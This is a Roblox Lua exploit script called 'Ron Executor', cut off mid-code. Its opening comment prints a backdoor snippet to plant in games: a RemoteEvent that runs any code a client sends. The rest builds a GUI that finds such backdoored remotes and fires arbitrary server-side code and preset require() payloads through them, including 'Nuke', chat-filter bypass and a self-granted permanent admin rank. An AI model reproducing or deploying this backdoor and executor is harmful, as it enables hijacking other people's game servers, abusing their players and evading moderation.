--[[
BEFORE EXECUTING READ THIS:

Welcome to Ron Executor: Version 0.6!
Ron Executor Is A Free Serverside Executed Through An Exploit.
How it works:
So The backdoor creates several RemoteEvent's Inside the game,
And Ron Executor Detects the Backdoored RemoteEvent, It Parents It to "Main".
NOTE: DON'T TOUCH THE REMOTE STUFF, IT'S NO LONGER REQUIRED.
And da creditz
Made by Debby#9641 aka me lol
Works on any game with this Script inside:
----------------------------------------------------------------------------
local Option1=Instance.new("RemoteEvent",game.ReplicatedStorage)
Option1.Name="DefaultChatFilterEvent"
Option1.OnServerEvent:Connect(function(b,c)
	require(script.Loadstring)(c)()
end)
----------------------------------------------------------------------------
And the loadstring
https://bit.ly/3AWXUHx
----------------------------------------------------------------------------
Also Rebexa is the best <3
]]
print("Welcome to Ron Executor, Join our discord server: discord.gg/q7bmfMH3sd")
-- Notification
game:GetService("StarterGui"):SetCore("SendNotification", {
Title = "Succsessfully Executed!";
Text = "Please Wait Within 5 Seconds To Load Ron Executor.";
Duration = 5;
Button1 = "Okay";
})
wait(5)
-- Instances
local ScreenGui = Instance.new("ScreenGui")
local e = Instance.new("TextBox")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UICornerR6 = Instance.new("UICorner")
local UICorner_2 = Instance.new("UICorner")
local UICorner_3 = Instance.new("UICorner")
local UICorner_7 = Instance.new("UICorner")
local UIListLayout = Instance.new("UIListLayout")
local TextButton_3 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local UICorner_6 = Instance.new("UICorner")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel = Instance.new("TextLabel")
local TextButtonR6 = Instance.new("TextButton")
local TextButton = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local TextBox = Instance.new("TextBox")
local UICorner_9 = Instance.new("UICorner")
local TextButton_7 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local TextButton_8 = Instance.new("TextButton")
local TextButton0_3 = Instance.new("TextButton")
local UICorner_110 = Instance.new("UICorner")
local UICorner_11 = Instance.new("UICorner")
local TextButton_9 = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local TextButton_10 = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local TextButton_11 = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local TextButton_12 = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local TextButton_13 = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local TextButton_14 = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local TextButton_15 = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local TextButton_16 = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local TextButton_17 = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local TextButton_18 = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local TextButton_19 = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local TextButton_20 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local TextButton_21 = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local TextButton_22 = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local TextButton_23 = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local TextButton_24 = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local TextButton_25 = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local TextButton_26 = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local TextButton_27 = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local Background = Instance.new("Frame")
local UICorner_31 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local g = game.Name

-- Notification
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Succsessfully Loaded!";
	Text = "Please Inject Ron Executor To Continue.";
	Duration = 5;
	Button1 = "Okay";
})

-- Remote thingy
local Remotes = {
	game.ReplicatedStorage.DefaultChatFilterEvent,
	game.StarterGui.SystemSoundOOF,
	game.Workspace.PlayerMovement,
	game.ReplicatedStorage.AdonisLoader,
	game.Lighting.RobloxAnimation
}
RandomRemote = math.random
local Remote = Remotes[RandomRemote(1, #Remotes)]

-- Gui Stuff

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.Position = UDim2.new(0.120576672, 0, 0.274015754, 0)
Main.Size = UDim2.new(0, 502, 0, 310)

UICorner.Parent = Main

UICorner_110.Parent = TextButton0_3

e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
e.Size = UDim2.new(0, 200, 0, 50)
e.Text = "e"
e.Font = Enum.Font.SourceSans
e.TextColor3 = Color3.fromRGB(0, 0, 0)
e.TextSize = 14.000
e.Visible=false

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.198396787, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 300, 0, 36)
TextLabel.Font = Enum.Font.GothamSemibold
TextLabel.Text = "Ron Executor"
TextLabel.TextColor3 = Color3.fromRGB(223, 223, 223)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.751502991, 0, 0.867741942, 0)
TextButton.Size = UDim2.new(0, 114, 0, 34)
TextButton.Font = Enum.Font.GothamSemibold
TextButton.Text = "Inject"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 21.000
TextButton.TextWrapped = true
TextButton.MouseButton1Click:connect(function()
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Status: Injecting..";
		Text = "Please Wait..";
		Duration = 5;
		Button1 = "Okay";
	})
	wait(2)
	-- Making The Remote Work
	Remote.Parent = Main
	ScrollingFrame.Visible=true
	Background.Visible=true
	TextBox.Size=UDim2.new(0, 361, 0, 225)
	-- Notification
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Status: Injected!";
		Text = "Now you can execute serverside scripts inside "..g.."!";
		Duration = 5;
		Button1 = "Okay";
	})
	-- Adding the R6 Button and deleting the inject button
	ImageLabel.ImageColor3=Color3.fromRGB(12, 255, 0)
	TextLabel_2.Text="Attached"
	TextButtonR6.Visible=true
	TextButton:Destroy()
end)	
	
UICornerR6.Parent = TextButtonR6

TextButtonR6.Parent = Main
TextButtonR6.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButtonR6.BorderSizePixel = 0
TextButtonR6.Position = UDim2.new(0.751502991, 0, 0.867741942, 0)
TextButtonR6.Size = UDim2.new(0, 114, 0, 34)
TextButtonR6.Font = Enum.Font.GothamSemibold
TextButtonR6.Text = "R6"
TextButtonR6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButtonR6.TextSize = 21.000
TextButtonR6.TextWrapped = true
TextButtonR6.Visible=false
TextButtonR6.MouseButton1Click:connect(function()
	e.Text = "require(6400944833):Fire('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_2.Parent = TextButton

TextButton_2.Parent = Main
TextButton_2.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.507014036, 0, 0.867741942, 0)
TextButton_2.Size = UDim2.new(0, 114, 0, 34)
TextButton_2.Font = Enum.Font.GothamSemibold
TextButton_2.Text = "Clear"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 21.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Click:connect(function()
e.Text=""
end)

UICorner_3.Parent = TextButton_2

TextButton0_3.Parent = Main
TextButton0_3.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton0_3.BorderSizePixel = 0
TextButton0_3.Position = UDim2.new(0.2624771, 0, 0.867741942, 0)
TextButton0_3.Size = UDim2.new(0, 114, 0, 34)
TextButton0_3.Font = Enum.Font.GothamSemibold
TextButton0_3.Text = "Unhide"
TextButton0_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton0_3.TextSize = 21.000
TextButton0_3.TextWrapped = true
TextButton0_3.Visible=false
TextButton0_3.MouseButton1Click:connect(function()
	TextBox.TextTransparency = 0
	TextButton_3.Visible=true
	TextButton0_3.Visible=false
end)

TextButton_3.Parent = Main
TextButton_3.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.2624771, 0, 0.867741942, 0)
TextButton_3.Size = UDim2.new(0, 114, 0, 34)
TextButton_3.Font = Enum.Font.GothamSemibold
TextButton_3.Text = "Hide"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 21.000
TextButton_3.TextWrapped = true
TextButton_3.MouseButton1Click:connect(function()
	TextBox.TextTransparency = 1
	TextButton_3.Visible=false
	TextButton0_3.Visible=true
end)

UICorner_4.Parent = TextButton_3


TextButton_4.Parent = Main
TextButton_4.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.0140280575, 0, 0.867741942, 0)
TextButton_4.Size = UDim2.new(0, 114, 0, 34)
TextButton_4.Font = Enum.Font.GothamSemibold
TextButton_4.Text = "Execute"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 21.000
TextButton_4.TextWrapped = true
TextButton_4.MouseButton1Click:connect(function()
	Remote:FireServer(e.Text)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Executed";
		Text = "Script was successfully executed!";
		Duration = 2;
		Button1 = "Okay";
	})
end)

UICorner_5.Parent = TextButton_4

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0180121195, 0, 0.116129033, 0)
TextBox.Size = UDim2.new(0, 482,0, 225)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.GothamSemibold
TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
TextBox.PlaceholderText = 'print("MizosuWare Can suck me off")'
TextBox.Text = 'require(0000000000).load("'..game.Players.LocalPlayer.Name..'")'
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000
TextBox.TextTransparency = 0
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

UICorner_6.Parent = TextBox

--[[Script Hub
░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░]]

ScrollingFrame.Parent = Main
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.75298804, 0, 0.116129033, 0)
ScrollingFrame.Size = UDim2.new(0, 114, 0, 221)
ScrollingFrame.ZIndex = 2
ScrollingFrame.ScrollBarThickness = 5
ScrollingFrame.Visible=false

UICorner_7.Parent = ScrollingFrame

UIListLayout.Parent = ScrollingFrame
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

TextButton_5.Parent = ScrollingFrame
TextButton_5.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_5.BackgroundTransparency = 1.000
TextButton_5.BorderSizePixel = 0
TextButton_5.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_5.Size = UDim2.new(0, 97, 0, 27)
TextButton_5.ZIndex = 2
TextButton_5.Font = Enum.Font.GothamSemibold
TextButton_5.Text = "Chips"
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextSize = 21.000
TextButton_5.TextWrapped = true
TextButton_5.MouseButton1Click:connect(function()
	e.Text = "require(5097644333).load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_8.Parent = TextButton_5

TextButton_6.Parent = ScrollingFrame
TextButton_6.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_6.BackgroundTransparency = 1.000
TextButton_6.BorderSizePixel = 0
TextButton_6.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_6.Size = UDim2.new(0, 97, 0, 27)
TextButton_6.ZIndex = 2
TextButton_6.Font = Enum.Font.GothamSemibold
TextButton_6.Text = "Imortality Dummy V2"
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextSize = 21.000
TextButton_6.TextWrapped = true
TextButton_6.TextScaled=true
TextButton_6.MouseButton1Click:connect(function()
	e.Text = "require(6786360854)('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_9.Parent = TextButton_6

TextButton_7.Parent = ScrollingFrame
TextButton_7.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_7.BackgroundTransparency = 1.000
TextButton_7.BorderSizePixel = 0
TextButton_7.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_7.Size = UDim2.new(0, 97, 0, 27)
TextButton_7.ZIndex = 2
TextButton_7.Font = Enum.Font.GothamSemibold
TextButton_7.Text = "Chat Imposter"
TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.TextSize = 21.000
TextButton_7.TextWrapped = true
TextButton_7.TextScaled=true
TextButton_7.MouseButton1Click:connect(function()
	e.Text = "require(5903403087).load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_10.Parent = TextButton_7

TextButton_8.Parent = ScrollingFrame
TextButton_8.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_8.BackgroundTransparency = 1.000
TextButton_8.BorderSizePixel = 0
TextButton_8.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_8.Size = UDim2.new(0, 97, 0, 27)
TextButton_8.ZIndex = 2
TextButton_8.Font = Enum.Font.GothamSemibold
TextButton_8.Text = "HD Admin"
TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.TextSize = 21.000
TextButton_8.TextWrapped = true
TextButton_8.TextScaled=true
TextButton_8.MouseButton1Click:connect(function()
	e.Text = "require(6357102206).hdadmin('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
	wait(9)
	e.Text = "require(game:GetService('ReplicatedStorage'):WaitForChild('HDAdminSetup')):GetMain():GetModule('API'):SetRank(game.Players."..game.Players.LocalPlayer.Name..", 5, 'Perm')"
	Remote:FireServer(e.Text)
end)

UICorner_11.Parent = TextButton_8

TextButton_9.Parent = ScrollingFrame
TextButton_9.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_9.BackgroundTransparency = 1.000
TextButton_9.BorderSizePixel = 0
TextButton_9.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_9.Size = UDim2.new(0, 97, 0, 27)
TextButton_9.ZIndex = 2
TextButton_9.Font = Enum.Font.GothamSemibold
TextButton_9.Text = "Grab Knife V3"
TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.TextSize = 21.000
TextButton_9.TextWrapped = true
TextButton_9.TextScaled=true
TextButton_9.MouseButton1Click:connect(function()
e.Text = "require(6783848871):Run('"..game.Players.LocalPlayer.Name.."','123')"
Remote:FireServer(e.Text)
end)

UICorner_12.Parent = TextButton_9

TextButton_10.Parent = ScrollingFrame
TextButton_10.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_10.BackgroundTransparency = 1.000
TextButton_10.BorderSizePixel = 0
TextButton_10.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_10.Size = UDim2.new(0, 97, 0, 27)
TextButton_10.ZIndex = 2
TextButton_10.Font = Enum.Font.GothamSemibold
TextButton_10.Text = "Cobra X"
TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.TextSize = 21.000
TextButton_10.TextWrapped = true
TextButton_10.TextScaled=true
TextButton_10.MouseButton1Click:connect(function()
	e.Text = "require(6088821526).load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_13.Parent = TextButton_10

TextButton_11.Parent = ScrollingFrame
TextButton_11.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_11.BackgroundTransparency = 1.000
TextButton_11.BorderSizePixel = 0
TextButton_11.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_11.Size = UDim2.new(0, 97, 0, 27)
TextButton_11.ZIndex = 2
TextButton_11.Font = Enum.Font.GothamSemibold
TextButton_11.Text = "Bunny Neko Girl"
TextButton_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.TextSize = 21.000
TextButton_11.TextScaled=true
TextButton_11.TextWrapped = true
TextButton_11.MouseButton1Click:connect(function()
	e.Text = "require(0x1ac71106f).nekouwu('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_14.Parent = TextButton_11

TextButton_12.Parent = ScrollingFrame
TextButton_12.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_12.BackgroundTransparency = 1.000
TextButton_12.BorderSizePixel = 0
TextButton_12.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_12.Size = UDim2.new(0, 97, 0, 27)
TextButton_12.ZIndex = 2
TextButton_12.Font = Enum.Font.GothamSemibold
TextButton_12.Text = "Ultra Skidded Cannon (May crash game)"
TextButton_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.TextSize = 21.000
TextButton_12.TextWrapped = true
TextButton_12.TextScaled=true
TextButton_12.MouseButton1Click:connect(function()
	e.Text = "require(7092373698).Load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_15.Parent = TextButton_12

TextButton_13.Parent = ScrollingFrame
TextButton_13.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_13.BackgroundTransparency = 1.000
TextButton_13.BorderSizePixel = 0
TextButton_13.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_13.Size = UDim2.new(0, 97, 0, 27)
TextButton_13.ZIndex = 2
TextButton_13.Font = Enum.Font.GothamSemibold
TextButton_13.Text = "Nuke"
TextButton_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.TextSize = 21.000
TextButton_13.TextWrapped = true
TextButton_13.TextScaled=true
TextButton_13.MouseButton1Click:connect(function()
	e.Text = "require(4867426485):SD2('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_16.Parent = TextButton_13

TextButton_14.Parent = ScrollingFrame
TextButton_14.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_14.BackgroundTransparency = 1.000
TextButton_14.BorderSizePixel = 0
TextButton_14.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_14.Size = UDim2.new(0, 97, 0, 27)
TextButton_14.ZIndex = 2
TextButton_14.Font = Enum.Font.GothamSemibold
TextButton_14.Text = "Voodoo Doll"
TextButton_14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.TextSize = 21.000
TextButton_14.TextWrapped = true
TextButton_14.TextScaled=true
TextButton_14.MouseButton1Click:connect(function()
	e.Text = "require(6191675567).load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_17.Parent = TextButton_14

TextButton_15.Parent = ScrollingFrame
TextButton_15.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_15.BackgroundTransparency = 1.000
TextButton_15.BorderSizePixel = 0
TextButton_15.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_15.Size = UDim2.new(0, 97, 0, 27)
TextButton_15.ZIndex = 2
TextButton_15.Font = Enum.Font.GothamSemibold
TextButton_15.Text = "Grab Knife V4"
TextButton_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.TextSize = 21.000
TextButton_15.TextWrapped = true
TextButton_15.TextScaled=true
TextButton_15.MouseButton1Click:connect(function()
	e.Text = "require(4690715583)('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_18.Parent = TextButton_15

TextButton_16.Parent = ScrollingFrame
TextButton_16.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_16.BackgroundTransparency = 1.000
TextButton_16.BorderSizePixel = 0
TextButton_16.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_16.Size = UDim2.new(0, 97, 0, 27)
TextButton_16.ZIndex = 2
TextButton_16.Font = Enum.Font.GothamSemibold
TextButton_16.Text = "Frying Pan"
TextButton_16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.TextSize = 21.000
TextButton_16.TextWrapped = true
TextButton_16.TextScaled=true
TextButton_16.MouseButton1Click:connect(function()
	e.Text = "require(2858525380).load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_19.Parent = TextButton_16

TextButton_17.Parent = ScrollingFrame
TextButton_17.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_17.BackgroundTransparency = 1.000
TextButton_17.BorderSizePixel = 0
TextButton_17.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_17.Size = UDim2.new(0, 97, 0, 27)
TextButton_17.ZIndex = 2
TextButton_17.Font = Enum.Font.GothamSemibold
TextButton_17.Text = "SCP-106"
TextButton_17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_17.TextSize = 21.000
TextButton_17.TextWrapped = true
TextButton_17.TextScaled=true
TextButton_17.MouseButton1Click:connect(function()
	e.Text = "require(4935275557):Subaru112('"..game.Players.LocalPlayer.Name.."', 'Subaru112's SCP-106')"
	Remote:FireServer(e.Text)
end)

UICorner_20.Parent = TextButton_17

TextButton_18.Parent = ScrollingFrame
TextButton_18.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_18.BackgroundTransparency = 1.000
TextButton_18.BorderSizePixel = 0
TextButton_18.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_18.Size = UDim2.new(0, 97, 0, 27)
TextButton_18.ZIndex = 2
TextButton_18.Font = Enum.Font.GothamSemibold
TextButton_18.Text = "Builderman Call"
TextButton_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.TextSize = 21.000
TextButton_18.TextWrapped = true
TextButton_18.TextScaled=true
TextButton_18.MouseButton1Click:connect(function()
	e.Text = "require(4024051473).call()"
	Remote:FireServer(e.Text)
end)

UICorner_21.Parent = TextButton_18

TextButton_19.Parent = ScrollingFrame
TextButton_19.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_19.BackgroundTransparency = 1.000
TextButton_19.BorderSizePixel = 0
TextButton_19.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_19.Size = UDim2.new(0, 97, 0, 27)
TextButton_19.ZIndex = 2
TextButton_19.Font = Enum.Font.GothamSemibold
TextButton_19.Text = "Dababy Convertible"
TextButton_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.TextSize = 21.000
TextButton_19.TextWrapped = true
TextButton_19.TextScaled=true
TextButton_19.MouseButton1Click:connect(function()
	e.Text = "require(6732268744).dababy('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_22.Parent = TextButton_19

TextButton_20.Parent = ScrollingFrame
TextButton_20.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_20.BackgroundTransparency = 1.000
TextButton_20.BorderSizePixel = 0
TextButton_20.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_20.Size = UDim2.new(0, 97, 0, 27)
TextButton_20.ZIndex = 2
TextButton_20.Font = Enum.Font.GothamSemibold
TextButton_20.Text = "Red Lights.exe"
TextButton_20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.TextSize = 21.000
TextButton_20.TextWrapped = true
TextButton_20.TextScaled=true
TextButton_20.MouseButton1Click:connect(function()
	e.Text = "require(6097532439):redlights('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_23.Parent = TextButton_20

TextButton_21.Parent = ScrollingFrame
TextButton_21.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_21.BackgroundTransparency = 1.000
TextButton_21.BorderSizePixel = 0
TextButton_21.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_21.Size = UDim2.new(0, 97, 0, 27)
TextButton_21.ZIndex = 2
TextButton_21.Font = Enum.Font.GothamSemibold
TextButton_21.Text = "Chat Bypass (Might Break Game)"
TextButton_21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_21.TextSize = 21.000
TextButton_21.TextWrapped = true
TextButton_21.TextScaled=true
TextButton_21.MouseButton1Click:connect(function()
	e.Text = "require(7173400233).e('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_24.Parent = TextButton_21

TextButton_22.Parent = ScrollingFrame
TextButton_22.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_22.BackgroundTransparency = 1.000
TextButton_22.BorderSizePixel = 0
TextButton_22.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_22.Size = UDim2.new(0, 97, 0, 27)
TextButton_22.ZIndex = 2
TextButton_22.Font = Enum.Font.GothamSemibold
TextButton_22.Text = "Dummy"
TextButton_22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_22.TextSize = 21.000
TextButton_22.TextWrapped = true
TextButton_22.MouseButton1Click:connect(function()
	e.Text = "require(4599958557).load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_25.Parent = TextButton_22

TextButton_23.Parent = ScrollingFrame
TextButton_23.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_23.BackgroundTransparency = 1.000
TextButton_23.BorderSizePixel = 0
TextButton_23.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_23.Size = UDim2.new(0, 97, 0, 27)
TextButton_23.ZIndex = 2
TextButton_23.Font = Enum.Font.GothamSemibold
TextButton_23.Text = "Steve"
TextButton_23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_23.TextSize = 21.000
TextButton_23.TextWrapped = true
TextButton_23.MouseButton1Click:connect(function()
	e.Text = "require(5820669639)('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_26.Parent = TextButton_23

TextButton_24.Parent = ScrollingFrame
TextButton_24.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_24.BackgroundTransparency = 1.000
TextButton_24.BorderSizePixel = 0
TextButton_24.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_24.Size = UDim2.new(0, 97, 0, 27)
TextButton_24.ZIndex = 2
TextButton_24.Font = Enum.Font.GothamSemibold
TextButton_24.Text = "Pizza Guy"
TextButton_24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_24.TextSize = 21.000
TextButton_24.TextWrapped = true
TextButton_24.TextScaled=true
TextButton_24.MouseButton1Click:connect(function()
	e.Text = "require(4657036575).load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_27.Parent = TextButton_24

TextButton_25.Parent = ScrollingFrame
TextButton_25.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_25.BackgroundTransparency = 1.000
TextButton_25.BorderSizePixel = 0
TextButton_25.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_25.Size = UDim2.new(0, 97, 0, 27)
TextButton_25.ZIndex = 2
TextButton_25.Font = Enum.Font.GothamSemibold
